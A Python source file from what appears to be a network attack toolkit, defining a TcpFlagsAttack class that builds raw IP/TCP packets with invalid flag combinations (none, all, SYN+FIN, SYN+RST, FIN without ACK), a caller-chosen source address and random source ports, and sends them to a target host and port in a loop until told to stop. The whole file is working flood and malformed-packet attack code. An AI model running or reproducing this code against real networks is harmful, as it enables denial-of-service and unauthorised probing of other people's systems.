import logging
import socket
from impacket import ImpactPacket
from attack_means import random_api as ram
from attack_means import tools as tm
from multiprocessing import Queue
from interact_module import different_types as dtm


class TcpFlagsAttack:

    @classmethod
    def send_tcp_packets_with_wrong_flags(cls,
                                          source_ip_address: str,
                                          destination_ip_address: str,
                                          destination_port: int,
                                          stop_signal_queue: Queue):
        raw_socket = tm.Tools.raw_socket_creator(socket.IPPROTO_TCP)
        while True:
            if not stop_signal_queue.empty():
                break
            # generate packet
            try:
                ip_packet = ImpactPacket.IP()
                ip_packet.set_ip_src(source_ip_address)
                ip_packet.set_ip_dst(destination_ip_address)
                tcp_packet = ImpactPacket.TCP()
                random_value = ram.RandomApi.rand_int(0, 4)
                TcpFlagsAttack.set_tcp_flags(tcp_packet, random_value)
                tcp_packet.set_th_dport(destination_port)
                tcp_packet.set_th_sport(ram.RandomApi.rand_int(32768, 65535))
                ip_packet.contains(tcp_packet)
                raw_socket.sendto(ip_packet.get_packet(), (destination_ip_address, destination_port))
            except Exception as e:
                logging.exception(e)

    @classmethod
    def set_tcp_flags(cls, tcp_packet, value):
        """
        根据不同的值完成选项的设置
        :param tcp_packet: tcp_packet
        :param value: 要怎样进行 tcp 标志位的设置
        :return:
        """
        if value == dtm.InvalidTcpFlags.EMPTY.value:
            tcp_packet.set_th_flags(0)
        elif value == dtm.InvalidTcpFlags.FULL.value:
            tcp_packet.set_th_flags(63)
        elif value == dtm.InvalidTcpFlags.SYN_AND_FIN_SET.value:
            tcp_packet.set_SYN()
            tcp_packet.set_FIN()
        elif value == dtm.InvalidTcpFlags.SYN_AND_RST_SET.value:
            tcp_packet.set_SYN()
            tcp_packet.set_RST()
        elif value == dtm.InvalidTcpFlags.FIN_SET_AND_ACK_NOT_SET.value:
            tcp_packet.set_FIN()
        else:
            raise ValueError(f"unexpected flag value settings")
